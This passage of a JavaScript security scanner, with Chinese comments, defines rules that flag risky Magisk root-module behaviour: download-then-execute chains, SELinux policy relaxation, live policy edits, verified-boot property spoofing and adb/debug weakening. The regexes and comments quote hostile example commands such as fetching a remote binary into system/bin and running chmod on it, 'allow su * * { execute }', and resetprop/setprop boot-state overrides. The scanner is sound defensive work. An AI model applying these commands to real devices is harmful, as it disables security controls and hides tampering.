      } else if (/^>{1,2}\S/.test(w)) {                       // `>path`（`2>` 之类带 fd 的不会走到这里）
        operand = w.replace(/^>{1,2}/, '');
        flag = '>';
      } else {
        const cluster = dteOutCluster(w);                     // 融合短选项簇：`-qO <路径>` / `-o<路径>`
        if (cluster === null) continue;
        if (cluster) {
          operand = cluster;                                  // 带值连写：值就粘在簇位后面（`-qO-` 也走这里 ⇒ 不立 sink）
        } else {
          operand = seg[k + 1] ? seg[k + 1].tok : null;
          if (seg[k + 1]) { opLine = seg[k + 1].line; k++; }
        }
      }
      if (!operand) continue;
      if (DTE_DIR_FLAG.test(flag)) {                          // sink 是**目录**：落地路径 = 目录 + URL basename
        const dir = dteNormalize(operand, assign);
        if (!dir) continue;
        const urlTok = seg.slice(1).find((t) => DTE_URL.test(dteWord(t.tok)));
        const base = urlTok ? dteUrlBasename(urlTok.tok) : null;
        if (!base) continue;                                  // 没有 basename 就不产生 sink，不猜
        const p = `${dir.replace(/\/+$/, '')}/${base}`;
        if (!sinks.has(p)) sinks.set(p, opLine);
        continue;
      }
      const p = dteNormalize(operand, assign);                // `-o -` 在这里返回 null：标准输出不是落盘
      if (p && !DTE_STDOUT_PATH.test(p) && !sinks.has(p)) sinks.set(p, opLine);
    }
  }
}

/** 执行形态与 chmod 证据。executedPaths 的形状按计划保留 kind，链的 snippet 靠它挑 chmod 那几行。 */
function dteCollectExecs(group, assign, execs, chmods) {
  const add = (map, key, rec) => {
    const list = map.get(key) || [];
    list.push(rec);
    map.set(key, list);
  };
  for (let si = 0; si < group.segments.length; si++) {
    const seg = group.segments[si];
    // 命令位：逻辑行的第一个词由 buildLineContexts 说话（第一段），段内被 ; | & ( ) 复位后的
    // 第一个词也算命令位（其余段）。两段的词首与 firstToken 只在「首行是注释」这类形状上分叉，
    // 分叉时把两个候选都过一遍判据 —— 只往**报告**的方向放宽，不往沉默方向放宽（fail closed）。
    const candidates = si === 0 ? [group.command, dteWord(seg[0].tok)] : [dteWord(seg[0].tok)];
    const seenWord = new Set();
    for (const raw of candidates) {
      const word = dteWord(raw);
      if (!word || seenWord.has(word)) continue;
      seenWord.add(word);
      const line = seg[0].line;
      const asPath = dteNormalize(word, assign);
      if (asPath) { add(execs, asPath, { path: asPath, line, kind: 'bare' }); continue; }
      if (DTE_EXEC_VERBS.has(word)) {
        for (let k = 1; k < seg.length; k++) {
          const w = dteWord(seg[k].tok);
          if (!w || w.startsWith('-')) continue;              // 选项位（`sh -x /p`）
          const p = dteNormalize(seg[k].tok, assign);
          if (p) { add(execs, p, { path: p, line: seg[k].line, kind: 'interp' }); break; }
        }
        continue;
      }
      if (word === 'chmod') {                                 // 只是证据，不是执行（见上面 DTE_EXEC_VERBS 那段）
        let mode = null;                                      // Task 3.1 §3：顺手记下 mode，DOWNLOAD_THEN_EXEC 不看它
        for (let k = 1; k < seg.length; k++) {
          const w = dteWord(seg[k].tok);
          if (!w || w.startsWith('-')) continue;
          if (mode === null && /^(?:[0-7]{3,4}|[ugoa]*[+-=][rwxXa]+)$/.test(w)) { mode = w; continue; }
          const p = dteNormalize(seg[k].tok, assign);
          if (p) { add(chmods, p, { path: p, line: seg[k].line, mode }); break; }
        }
      }
    }
  }
}

const DOWNLOAD_THEN_EXEC_TITLE = '远程内容落盘后被执行（先下载再执行）';
const DOWNLOAD_THEN_EXEC_ADVICE = 'curl/wget 把远程内容写到磁盘后再被拿去执行 —— 与 `curl | sh` 是同一件事的两种写法，'
  + '之前的规则只认管道那一支，所以这条路落到 low 并被自动放行。'
  + '落盘的那份字节本次没有读过（它不在这个 zip 里），必须先校验和或由作者把产物一并提交，再定处置。';

export const DOWNLOAD_THEN_EXEC = {
  id: 'DOWNLOAD_THEN_EXEC',
  category: 'execution',
  severity: 'high',
  title: DOWNLOAD_THEN_EXEC_TITLE,
  // anchor：载荷出现在一行里任何位置都算 —— 这里说的是「命令位由逻辑行说话」，
  // 前缀形态（`x=1; curl … -o …`）照样成立，由 audit/scan.test.mjs 的锚点闭包表逐条验证。
  anchor: 'anywhere',
  anchorSibling: null,
  pattern: null, // 见上面那段：跨行规则的匹配不住在单个正则上，null 是有意为之
  advice: DOWNLOAD_THEN_EXEC_ADVICE,
  scan(file, text) {
    const src = String(text == null ? '' : text);
    const lines = src.split(/\r?\n/);
    const contexts = buildLineContexts(lines); // fix6-F1 那份命令位实现，本规则复用（导出的唯一理由）
    const assign = dteLiteralAssignments(lines);
    const groups = dteGroups(lines, contexts);
    const sinks = new Map();   // downloadSinks：归一化路径 -> 首个落地行
    const execs = new Map();   // executedPaths：归一化路径 -> [{ path, line, kind }]
    const chmods = new Map();  // 同一条链的 chmod 证据：路径 -> [{ path, line }]
    for (const g of groups) {
      dteCollectSinks(g.segments, assign, sinks);
      dteCollectExecs(g, assign, execs, chmods);
    }
    // 与 PIPE_TO_SHELL 的硬约束（工单 §2）：某条链的「执行行」同时是管道直连的命中行时，本规则在那一行不出。
    // 两条规则的分工是「管道那一行归 PIPE_TO_SHELL」，所以这里让位而不是双报；
    // 与 EXEC_BUNDLED_FILE 相反 —— 那一格两条都要出（包内引用被执行 / 远程内容落盘后执行是两个事实）。
    const pipeLines = new Set();
    for (const f of PIPE_TO_SHELL.scan(file, src)) pipeLines.add(f.line);
    const chains = [];
    for (const [path, sinkLine] of sinks) {
      const list = (execs.get(path) || [])
        .filter((e) => e.line > sinkLine && !pipeLines.has(e.line))
        .sort((a, b) => a.line - b.line);
      if (!list.length) continue;                 // 只下载不执行 / 执行早于落地：都不构成链
      chains.push({ path, sinkLine, exec: list[0] }); // 一条链只报一次：同一个 sink 的多种执行形态取最早那行
    }
    chains.sort((a, b) => (a.exec.line - b.exec.line) || (a.sinkLine - b.sinkLine)
      || (a.path < b.path ? -1 : (a.path > b.path ? 1 : 0)));
    const findings = [];
    for (const c of chains.slice(0, MAX_DTE_CHAINS_PER_FILE)) {
      const parts = [String(lines[c.sinkLine - 1] == null ? '' : lines[c.sinkLine - 1]).trim()];
      for (const ch of (chmods.get(c.path) || [])) {
        if (ch.line > c.sinkLine && ch.line < c.exec.line) {
          parts.push(String(lines[ch.line - 1] == null ? '' : lines[ch.line - 1]).trim());
        }
      }
      parts.push(String(lines[c.exec.line - 1] == null ? '' : lines[c.exec.line - 1]).trim());
      findings.push({
        ruleId: 'DOWNLOAD_THEN_EXEC',
        category: 'execution',
        severity: 'high',
        file,
        line: c.exec.line,
        snippet: trimSnippet(parts.join(' -> ')), // 「一条链」的证据本来就分布在几行上，snippet 要一起带过去
        message: DOWNLOAD_THEN_EXEC_TITLE,
        advice: DOWNLOAD_THEN_EXEC_ADVICE,
      });
    }
    return findings;
  },
};

// ---------------------------------------------------------------------------
// Task 3.1 §3：DOWNLOAD_TO_MODULE_EXEC —— 「远程内容被写进会被覆盖进系统分区的位置，并加成可执行」
// ---------------------------------------------------------------------------
//
// 洞（计划 §0.18 实测，不是推演）：`Magisk-Modules-Alt-Repo/tree` 整包 **low / auto-approve**：
//   customize.sh:38  wget -qO "$MODPATH/system/bin/bash" "$url"
//   customize.sh:41  if [ $? -eq 0 ] && [ -f "$MODPATH/system/bin/bash" ]; then
//   customize.sh:43  chmod 0755 "$MODPATH/system/bin/bash"
// 它从远程拉一个 bash 进模块的 `system/bin/`、加成可执行 —— 今天没有任何一条规则说这句话，
// 而 low + 首次收录走的就是机器人自动合并通道。§3.9 那条「只 chmod 不执行」的已知限度
// 今天在真包里落地了，而且落在自动通道上。
//
// 它与 DOWNLOAD_THEN_EXEC 是**两个不同的主张**，所以另立 ruleId、另写文案：
//   DOWNLOAD_THEN_EXEC  —— 远程内容被拿去**执行**（必须有人跑它）；
//   本规则              —— 远程内容被写进**安装时会被覆盖进系统分区**的位置并加了执行位
//                          （没人执行它，Magisk 挂载模块时替它把这条路铺开）。
// 两条同时命中时都出（与 EXEC_BUNDLED_FILE 那一格同一取舍：两个事实不许互相吞）。
//
// 判据窄，两个条件**都要**，缺一个都不报：
//   ① sink 路径归一化后落在模块的安装可见位置（见 dtmeVisibleModulePath）；
//   ② 同一篇文本里有 chmod 对**同一条路径**加执行位（见 dtmeGrantsExec），且晚于落地行。
// 路径判据与 DOWNLOAD_THEN_EXEC 共用同一份 dteNormalize/dteCollectSinks —— 精确相等，
// 一件宽松都没做（同目录就算 / 按 basename 算 / 去掉扩展名再比，§0.18 实测任取一种就有四个正经包变 high）。

/** 每文件每规则的上限：与工厂的 maxPerFile 同值，基数是「落地 + 加执行位」的对数。 */
const MAX_DTME_PAIRS_PER_FILE = 20;

/**
 * 条件①：落地路径归一化后落在模块的**安装可见位置**。
 * 只认这三形（工单 §3 原话）：模块相对路径以 `system/` 开头；`$MODPATH`/`$MODDIR`/`${MODPATH}`/`${MODDIR}`
 * 直接拼出的 `service.d/`；以及 `/data/adb/modules/<id>/system/…` 的绝对形态。
 * 绝对形态那一条**不认 moduleId**（本文件的折算拿不到它，与 DOWNLOAD_THEN_EXEC 同一口径、同一代价）：
 * 于是模块 id 拼错的路径会被折成「另一个模块的目录」，方向是 fail closed。
 * 不认的形态（写进已知限度，别当成已覆盖）：模块根的裸文件（`$MODPATH/tool`）、`$MODPATH/system.prop`、
 * 模块里别的自建目录、以及**全局** `/data/adb/service.d/`（那不是模块的 system/ 覆盖点，
 * tailscaled:48 那种正经写法一旦收进来就是拿误伤换命中）。
 */
function dtmeVisibleModulePath(p) {
  if (!p || p.charAt(0) !== DTE_MOD_REL) return false;
  const rel = p.slice(DTE_MOD_REL.length);
  return /^(?:system\/|service\.d\/)/.test(rel)
    || /^data\/adb\/modules\/[^/]+\/system\//.test(rel);
}

/**
 * 条件②：这一串 mode 有没有**加**执行位。
 * 八进制：末三位里任何一位带 x（1/3/5/7）就算 —— `0755`/`755`/`0700`/`700`/`750` 算，`644`/`0644`/`600` 不算。
 * 符号：只认 `+x` 这一族（`+x` / `u+x` / `a+x`），逗号分隔的多段子句逐个看。
 * **不认的两族**（放宽等于往误伤方向走，工单 §3 的族里没有它们）：`u=rwx` 这类 `=` 赋值、
 * 以及 `chmod --preserve-root` 之类把 mode 交给变量而钉不住的写法（`mode` 记成 null ⇒ 不报）。
 */
function dtmeGrantsExec(mode) {
  if (!mode) return false;
  if (/^[0-7]{3,4}$/.test(mode)) return /[1357]/.test(mode.slice(-3));
  return String(mode).split(',').some((c) => /^[ugoa]*\+[rwxXa]*x/.test(c));
}

const DOWNLOAD_TO_MODULE_EXEC_TITLE = '远程内容被下载进模块的 system/ 或 service.d/ 并加成可执行';
const DOWNLOAD_TO_MODULE_EXEC_ADVICE = 'curl/wget 把远程字节写进模块安装时会被覆盖进系统分区的位置（system/… 或 $MODPATH/service.d/…），'
  + '同一篇文本里又被 chmod 加了执行位 —— 这一格不需要谁去执行它，挂载模块时这条路就铺好了。'
  + '与「先下载再执行」是两件事，所以这条单独报。落盘的那份字节本次没有读过（它不在这个 zip 里），'
  + '必须人工核对下载地址、校验和与该二进制声称的功能。';

export const DOWNLOAD_TO_MODULE_EXEC = {
  id: 'DOWNLOAD_TO_MODULE_EXEC',
  category: 'execution',
  severity: 'high',
  title: DOWNLOAD_TO_MODULE_EXEC_TITLE,
  // anchor 与 DOWNLOAD_THEN_EXEC 同一声明：载荷出现在一行里任何位置都算，命令位由逻辑行说话。
  anchor: 'anywhere',
  anchorSibling: null,
  pattern: null, // 同族口径：跨行规则的匹配不住在单个正则上，null 是有意为之（redactText 走 !r.pattern 分支）
  advice: DOWNLOAD_TO_MODULE_EXEC_ADVICE,
  scan(file, text) {
    const src = String(text == null ? '' : text);
    const lines = src.split(/\r?\n/);
    const contexts = buildLineContexts(lines); // 与 DOWNLOAD_THEN_EXEC 同一份命令位实现，不写第二套口径
    const assign = dteLiteralAssignments(lines);
    const groups = dteGroups(lines, contexts);
    const sinks = new Map();   // 归一化路径 -> 首个落地行（下载段的识别与老规则共用同一份代码）
    const chmods = new Map();  // 归一化路径 -> [{ path, line, mode }]
    for (const g of groups) {
      dteCollectSinks(g.segments, assign, sinks);
      dteCollectExecs(g, assign, new Map(), chmods); // 执行形态这一半本规则用不上，chmod 证据才用
    }
    const pairs = [];
    for (const [path, sinkLine] of sinks) {
      if (!dtmeVisibleModulePath(path)) continue;                 // 条件①
      const grants = (chmods.get(path) || [])
        .filter((c) => c.line > sinkLine && dtmeGrantsExec(c.mode)) // 条件②（顺序与老规则同向：先落地后加位）
        .sort((a, b) => a.line - b.line);
      if (!grants.length) continue;                               // 缺任何一个条件都不报
      pairs.push({ path, sinkLine, chmod: grants[0] });            // 一条落地只报一次：取最早那次加执行位
    }
    pairs.sort((a, b) => (a.chmod.line - b.chmod.line) || (a.sinkLine - b.sinkLine)
      || (a.path < b.path ? -1 : (a.path > b.path ? 1 : 0)));
    const findings = [];
    for (const p of pairs.slice(0, MAX_DTME_PAIRS_PER_FILE)) {
      findings.push({
        ruleId: 'DOWNLOAD_TO_MODULE_EXEC',
        category: 'execution',
        severity: 'high',
        file,
        line: p.chmod.line, // 报在「加执行位」那一行：这条规则说的话是「落地 + 加成可执行」这一句
        snippet: trimSnippet([
          String(lines[p.sinkLine - 1] == null ? '' : lines[p.sinkLine - 1]).trim(),
          String(lines[p.chmod.line - 1] == null ? '' : lines[p.chmod.line - 1]).trim(),
        ].join(' -> ')),
        message: DOWNLOAD_TO_MODULE_EXEC_TITLE,
        advice: DOWNLOAD_TO_MODULE_EXEC_ADVICE,
      });
    }
    return findings;
  },
};

// ---------------------------------------------------------------------------
// ②-c root 提权语义（root）
// ---------------------------------------------------------------------------
//
// 这一节管的不是「用了什么危险命令」，而是「模块拿着 root 干了什么」：
// 放宽 SELinux 策略、运行时改整机策略、伪造启动/完整性状态、改变整机安全档位。
// 这四类以前一条都不咬 —— sepolicy.rule 压根不在扫描面里，resetprop 改 boot 状态也没有规则，
// 于是「把 payload 写成 SELinux 授权」是全自动放行的通道。
//
// 误伤是这里的主要成本（烧的是人工容量），所以每条规则的锚点都是「动词 + 参数形状」，
// 不是裸关键词：HARDCODED_IP 在一个正经模块上白送 9 条 medium 就是前车之鉴。
// 注释行按本仓既有先例（HARDCODED_IP / SUSPICIOUS_DOMAIN / PRIVACY_SECRET / EXEC_BUNDLED_FILE
// 都用 exclude: /^\s*#/）一律跳过。

/**
 * 「这一行只是在打印或说明里提到这条命令」的写法不算执行 —— 只在同一行内判断。
 * 真要去执行，执行那一行一定带痕迹（`$(…)`、反引号、`;` `&` `|`、函数体 `{`、重定向 `<` `>`），
 * 有任一痕迹就不豁免；纯说明行（`echo "setprop ro.secure 0"`）由此不再占用人工容量。
 * 注意要看到动词**左边**那一串（`line.slice(0, m.index)`），而不是 m[0] 之后：
 * `$(resetprop …` 里触发豁免判断的是 `$`，`echo x; resetprop …` 里是 `;`，
 * `$(magiskpolicy …` 里是 `(` —— 三类规则吃掉的字符数不一样，只有「左边紧邻」这个判据对谁都成立。
 */
const DOC_ONLY_VERB = /^\s*(?:echo|printf?|print|ui_print|log[a-z0-9_]*|debug[a-z0-9_]*|set_?progress|abort|notify)\b/;
const EXECUTION_POSITION = /[$`;&|{(]\s*$/;
function isDocOnlyMention(m, line) {
  if (/^\s*#/.test(line)) return true;
  if (!DOC_ONLY_VERB.test(line)) return false;
  if (EXECUTION_POSITION.test(line.slice(0, m.index))) return false;
  if (/[<>]/.test(line)) return false;
  return true;
}

// fix4-P12：赋值位 —— `SELINUX_ALLOW="allow … { execute }"`、`description=allow …` 这类
// 「把规则文本存进变量 / 写进说明字段」的写法。判据看的是匹配**左边紧邻**的那一串：
// 行首只有一个 `标识符 =` 加可选引号，且整行没有重定向 / 命令替换 / 并行语句的痕迹。
// 为什么非但不能省还得单独写：这条豁免原来是 `^\s*` 锚点顺带挡出来的，锚点一撤就露出来，
// 所以豁免要显式搬进 exclude 里，只往豁免侧收窄，不许往载荷侧收（简报同一句话）。
const ASSIGNMENT_POSITION = /^\s*[A-Za-z_][A-Za-z0-9_.]*\s*=\s*["']?$/;
function isAssignedStringConstant(m, line) {
  if (!ASSIGNMENT_POSITION.test(line.slice(0, m.index))) return false;
  if (/[<>$`;&|]/.test(line)) return false; // 写出 / 命令替换 / 同行还有别的语句 ⇒ 不是纯赋值位
  return true;
}

export const SELINUX_POLICY_RELAX = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'SELINUX_POLICY_RELAX', category: 'root', severity: 'high', title: '放宽 SELinux 策略',
  // 原写法（评审 F2，实测打不中自己的夹具）：`allow\s+\S+\s+\S+\s+[^\s{]*\*\s*:\s*[^\s{]*\{` ——
  // 它要求第 4 个 token 里带 `*`，而 `allow su * fs:file { … }` 的 `*` 是**独立一个 token**，
  // `allow su u:r:magisk:s0 fs:file { … }` 更是根本没有 `*`。两种真实写法全 MISS。
  // 新写法不猜 token 位置：`allow` 之后到 `{` 之前随便什么，只要求权限块里出现执行类权限或 `*`。
  // 只认 `allow` —— deny/auditallow/dontaudit 是收紧或抑制日志，攻击者要的是授予，把它们打进来只会涨假阳性。
  // 权限集里去掉了旧写法里的 `write|create|getattr`：正经模块给自家文件写权限极常见，
  // 留在里面就是 F6 那类「合法模块被拦范围扩大」，而 execute/execmem/setattr 才是提权的形状。
  // fix2-P4b：旧集合里的 `enforceforce` 不是任何真实 SELinux 策略里存在的权限名，是条死分支
  // （写它的人想覆盖的是「授予运行时关强制的能力」）—— 换成 kernel:security 类里真实存在的
  // `setenforce`（`allow init kernel:security { setenforce }` 就是 magiskpolicy 会照单执行的授权行）。
  // fix2 之前这里的说法是「行首锚定 `^\s*` 是这条规则唯一的收窄条件」—— 那句话在本轮被推翻：
  // 锚点确实顺带挡掉了 `echo "allow …"` 与 `SELINUX_ALLOW="allow …"`，但它同时把
  // `printf "allow …\n" >> 策略文件` 这种**合法写法**一起挡成了隐形载荷（见下面 fix4-P12）。
  // fix4-P12：`^\s*` 换成左边界类（与 VERIFIED_BOOT_SPOOF / EXEC_BUNDLED_FILE 同一写法）。
  // 原锚点表达的是「.te 文件的一行以 allow 开头」，可同一语法出现在脚本里就是真载荷通道，
  // 简报在 d235927 上实测这两条常规写法全是 0 命中：
  //   x=1; allow su * * { execute };
  //   printf "allow su * * { execute }\n" >> /data/adb/magisk/policy
  // 后一条根本不是花招，而是模块写 SELinux 策略最普通的写法（printf >> 策略文件）。
  // 锚点挡掉的从来不是攻击者，是写在下一行、下一个语句里的真 payload；原先由锚点顺带
  // 兼任的两条豁免（整行注释、字符串常量/赋值位）现在显式写在 exclude 里。
  // 载荷侧一个字都没收：{…} 权限集与前后的 token 判据与 fix2 之后一致。
  exclude(m, line) {
    if (isDocOnlyMention(m, line)) return true;     // 整行注释（编译器只认行首 #）+ echo/printf 说明位
    return isAssignedStringConstant(m, line);        // 变量赋值位与 description= 文案位
  },
  pattern: /(?:^|[\s"';&|`(])allow\s+[^{};]*\{[^}]*(?:\b(?:execute|execmem|execstack|execute_no_trans|setattr|setenforce)\b|\*)/,
  advice: '放宽 SELinux 的 allow 规则。root 模块加 allow 就是给自己开权限，必须人工确认它授予了什么、给谁。',
});

// fix3-P8：`typepermissive su;` / `permissive magisk;` 关掉的是**整个域**的强制 —— 该域之后
// 任何越权都只记日志不拦，比上面那条 allow 授予得更宽，实测在 cd79136 上却是 0 hits（没有规则）。
// 坑（简报确认）：SELINUX_POLICY_RELAX 的 pattern 硬要求动词之后出现 `{`，
// 所以「把 allow 扩成 allow|permissive|typepermissive」这条捷径打不中 —— 必须自成一支。
// 分成两支的理由（假阳性边界，误伤烧的是人工容量）：
//   ① 行首位（`^\s*(?:type)?permissive`）：策略文件里这就是语句本体，`;` 可省
//      （很多 sepolicy.rule 真的写 `typepermissive su` 不带分号）；
//   ② 行中间（前一个字符是非单词字符）：**必须**带 `;` 才算语句。
//      少了这个分号要求，`description=permissive license` 这类英文说明就会变 high ——
//      而 `description=` 这类 key=value 行是本仓扫描面里最常见的合法散文。
// 豁免沿用 isDocOnlyMention：整行注释与 echo 说明位仍然豁免；
// 而「同行前置一句 echo 说明」挡不住后面的真语句 —— 那要靠 fix3-P7 的逐匹配豁免。
// 已知未覆盖（写在这里，不当成已修）：`magiskpolicy "typepermissive su"` 这种不带 `--live`
// 也不带 `;` 的引号参数形态；带 `--live` 的由 MAGISK_POLICY_LIVE 判 high，结论一样是转人工。
// fix7-P15（本轮）：分支二尾部原来还挂着 `(?:\s+[A-Za-z0-9_.\-:]+)*` ——「permissive 之后可以跟
// 任意多个空格分隔的词，只要整段以 `;` 收尾」。这就是英文散文被读成策略语句的**唯一**原因：
// SELinux 的一条语句不会含空格隔开的散文。实测烧掉的是人工容量（PerformanC/ReZygisk 的
// `webroot/LICENSE:189` `-permissive terms added in accord with section 7 apply to the code;`
// 被判 high），而 GPL 许可证几乎是投稿包里最常见的随附文本。删掉那一个组、不加分支也不加谓词：
// 加一条豁免就少一条能咬人的形状，这笔账要留给真实投稿量再算。
// 分支一（行首那支）一个字没动，所以 `permissive su_t magisk_t;` 这种行首多类型写法继续由它接住；
// 代价是「行中 + 一行多类型 + 不带花括号」（`x=1; permissive su_t magisk_t;`）本轮起不再命中，
// 这一处由 audit/scan.test.mjs 的 P15 已知限度用例钉住，不许日后当「顺手简化」放回去。
export const SELINUX_TYPE_PERMISSIVE = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'SELINUX_TYPE_PERMISSIVE', category: 'root', severity: 'high',
  title: 'permissive/typepermissive 关掉整个域的 SELinux 强制',
  advice: 'permissive 让该域的所有拒绝降级为只记日志，等同把这台机器上的一个域移出强制访问控制；'
    + '必须人工确认放开的是哪个域、模块自称的功能为什么需要它。',
  exclude: isDocOnlyMention,
  pattern: /(?:^\s*(?:type)?permissive\s+(?:\{[^}]*\}|[A-Za-z0-9_.\-:]+)|[^\w](?:type)?permissive\s+(?:\{[^}]*\}|[A-Za-z0-9_.\-:]+)\s*;)/,
});

export const MAGISK_POLICY_LIVE = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'MAGISK_POLICY_LIVE', category: 'root', severity: 'high', title: '运行时改全局 SELinux 策略',
  // `[^|;\n]*` 把动词与 --live 锁在同一条命令里：`supolicy` 打完 `--live` 才算这台机器改了整机策略。
  // 已知漏检（如实写着，不当成合法写法）：`MP="magiskpolicy"; $MP --live …` 这种变量间接。
  exclude: isDocOnlyMention,
  pattern: /\b(?:magiskpolicy|supolicy)\b[^|;\n]*--live\b/,
  advice: '--live 改的是整机策略，影响面超出本模块；需要人工确认改的是哪几条域。',
});

export const VERIFIED_BOOT_SPOOF = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'VERIFIED_BOOT_SPOOF', category: 'root', severity: 'high', title: '篡改启动/完整性状态属性',
  // 旧写法的 `dm-?verity[_-]?verity` 拼不出任何真实属性名（实测 `ro.boot.veritymode` MISS），
  // `vbstate` 也不是真键名。换成四个真实存在的键。
  // 允许 resetprop 与 setprop 两种写法（模块里两种都在用），并要求前面是行首/空白/引号，
  // 免得 `getprop ro.boot.verifiedbootstate` 这种**只读**的行被当成篡改。
  // 前缀类比简报多了 `& | ; ( 反引号`：`echo "$(resetprop -w ro.boot.verifiedbootstate green)"`
  // 用原写法实测打不中（`$(` 不在类里），而命令替换是真执行，不是文档。
  // fix3-P7：动词与键名之间的 `[^\n]*` 改成 `[^|;&\n]*`（与上面 MAGISK_POLICY_LIVE 同例）。
  // 贪心的 `[^\n]*` 会把一行里的**两条**命令并成**一个**匹配 ——
  // `echo "resetprop -w ro.boot.verifiedbootstate green"; resetprop -w ro.boot.verifiedbootstate green`
  // 实测 matches=1，而那一个匹配以 `echo "` 开头 ⇒ 被 isDocOnlyMention 豁免，工厂再逐匹配看也救不回来。
  // 锁在同一条命令里之后每行有两个匹配：前半行豁免、后半行照报 high。
  exclude: isDocOnlyMention,
  pattern: /(?:^|[\s"';&|`(])(?:resetprop|setprop)[^|;&\n]*\bro\.boot\.(?:verifiedbootstate|vbmeta\.device_state|flash\.locked|veritymode)\b/,
  advice: '绕过完整性校验（Play Integrity / 安全检测）。它与模块自称的功能是否相符，只能人来判。',
});

/**
 * fix5-F2：「哪个键的哪个值是削弱整机安全档位」只许有一份字面量。
 * 简报实测（snake-4/Zygisk-Assistant 的 post-fs-data.sh —— 那个包的全部工作就是把属性刷回锁定值）：
 * 旧 DEBUGGABLE_ENABLE 的尾巴是 `[=\s]+[01]\b`，0 与 1 两个方向都收，于是
 *   medium  resetprop_if_diff ro.secure 1        <- 加固，被当成罪状
 *   medium  resetprop_if_diff ro.debuggable 0    <- 加固，被当成罪状
 * 把整包 medium 从 7 顶到 9 —— 报的是「作者在恢复安全」这件事本身。
 * 现在脚本侧（set/resetprop）与 .prop 侧（key=value，fix3-P9 那一条）都从这张表生成 pattern，
 * 配对只有一个方向：`weaken` 是**削弱值**，它的反值是加固/默认安全状态，不构成发现。
 * 键集与 fix3-P9 那份完全一致（四个具名键）。脚本侧以前只认前两个键、且不看值 ——
 * 这里补齐成同一张表是「同一意图换个入口（setprop 还是写 .prop）不该决定过不过闸」，
 * 实测四个真包与干净语料上新增 0 条发现（唯一的 `ro.adb.secure` 出现处是加固值 1，正确地不命中）。
 * `persist.*` / `sys.usb.controller` 仍是不覆盖的缺口（见下面 PROP_BOOT_SPOOF 的披露），
 * 不许往这张表里偷偷加键。
 */
export const SECURITY_WEAKEN_PAIRS = Object.freeze([
  { key: 'ro.debuggable', weaken: '1' },      // 1 = 整机可调试
  { key: 'ro.secure', weaken: '0' },          // 0 = adb 无需授权
  { key: 'ro.adb.secure', weaken: '0' },      // 0 = 同上（运行期那一半）
  { key: 'service.adb.root', weaken: '1' },   // 1 = adb 直接拿到 root
]);

const reEsc = (s) => String(s).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

export const DEBUGGABLE_ENABLE = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'DEBUGGABLE_ENABLE', category: 'root', severity: 'medium', title: '改变整机安全档位',
  // 同样要覆盖 `.prop` 里的 `key=value` 形态，见下面那条 PROP_* 的说明；这里管脚本里的 set/resetprop。
  // `[=\s]+<削弱值>\b` 是它的收窄条件：`resetprop ro.debuggable`（只删不改）、
  // `resetprop -w ro.debuggable $VALUE`（值走变量）、`getprop ro.debuggable`（只读）都不命中。
  // fix3-P7：两处 `[^\n]*` 一并换成 `[^|;&\n]*`（同 VERIFIED_BOOT_SPOOF 的理由）——
  // `echo "setprop ro.secure 0"; setprop ro.secure 0` 实测曾经 matches=1（两条命令被贪心 span 并成一个匹配）
  // → 整行被豁免 → 0 findings。锁成「动词、键名、值都在同一条命令里」之后是两个匹配，前半行豁免、后半行照报。
  // fix5-F2：值从 `[01]` 换成「这个键自己的削弱值」，四个键的配对由 SECURITY_WEAKEN_PAIRS 生成，
  // 与 .prop 侧同源；键名与值之间仍不许跨命令边界。
  exclude: isDocOnlyMention,
  pattern: new RegExp('(?:^|[\\s"\';&|`(])(?:resetprop|setprop)[^|;&\\n]*(?:'
    + SECURITY_WEAKEN_PAIRS.map((p) => `\\b${reEsc(p.key)}\\b[^|;&\\n]*[=\\s]+${p.weaken}\\b`).join('|')
    + ')'),
  advice: 'ro.debuggable / ro.secure / ro.adb.secure / service.adb.root 被改成削弱值（1 / 0 / 0 / 1）'
    + '就是长期放宽整机调试面，作者必须在描述里说明理由；把同一批键刷回安全值不算 offence。',
});

// 评审 F4（复现属实）：`.prop` 直写是完整通道，四条 resetprop 锚定的规则一条都不咬。
// 实测 scanContent('system.prop', 'ro.boot.verifiedbootstate=green…') 曾经是 []，而 `.prop`
// 本来就在扫描面内（scan.mjs 的 PROP_EXTS），所以「未扫描文本」那条覆盖度规则也兜不住它。
// 这是 Magisk 最惯用的写法（不改脚本，只在 system.prop 里写属性），锚点必须换成「键名」本身。
// 已拍定（2026-10-13）：纳入，severity `high`。它把「在 .prop 里写 boot 状态」的模块全都推入
// 人工队列，而这类模块在国内普遍存在（解锁 / bl 修复类）；假阳性来源正是那些合法改机模块，
// 收益是关掉一条当前完全敞开的自动放行通道。定 high（转人工）而不是任何自动拒绝 ——
// 让双签去承担判断，不让规则去承担结论。
// fix2-P4a（真相二选一，这里选「不覆盖」）：本规则只覆盖四个 `ro.boot.*` 完整性键。
// `persist.*` 与 `sys.usb.controller` 一类运行期键**不在**范围内 ——
// 文案（title/message/advice）不许承诺覆盖它们（scan.test.mjs 有一致性锁），
// 而「.prop 直写非 boot 家族安全键」作为已知缺口在任务报告里如实披露，不偷偷扩面。
// fix3-P9 更新了这句话的一半：裸 `ro.*` 安全键里**具名的四个削弱键**现在由下面
// PROP_SECURITY_WEAKEN 兜住；`persist.*` / `sys.usb.controller` 仍是上面披露的缺口。
// fix4-P13 的两个键表与「写出动词」前缀各只有一份字面量：行首那一支与「脚本写出」那一支共用同一份，
// 免得键表在两条臂里各写一遍然后慢慢漂移（简报：键表不许扩）。
// WRITE_FORM 的三个判据：
//   ① 动词只在命令位（行首或紧跟一个非单词字符）—— `ui_print` 里那个 print 不算；
//   ② 动词到键名之间不许跨命令边界 `[^|;&\n]*`（fix3-P7 同一判据：贪心的 `[^\n]*` 会把一行里
//      两条命令并成一个匹配，于是豁免判断只能看最左那半行）；
//   ③ 键名之后必须出现重定向 `>>?` —— `echo "ro.x=1"` 只是把它打印出来，
//      `echo "ro.x=1" >> system.prop` 才是落盘。这一条是**豁免侧**的收窄，载荷侧不加条件。
